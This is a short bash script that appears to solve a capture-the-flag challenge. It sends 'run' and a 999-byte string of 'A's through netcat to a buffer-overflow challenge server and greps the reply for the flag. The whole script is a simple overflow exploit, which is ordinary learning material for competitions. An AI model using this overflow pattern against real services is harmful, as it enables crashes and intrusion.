#!/bin/bash

python3 -c "print('run');print('A'*999)" | nc -w 1 buffer-overflow.ctfcompetition.com 1337 > output.txt

cat output.txt | grep CTF
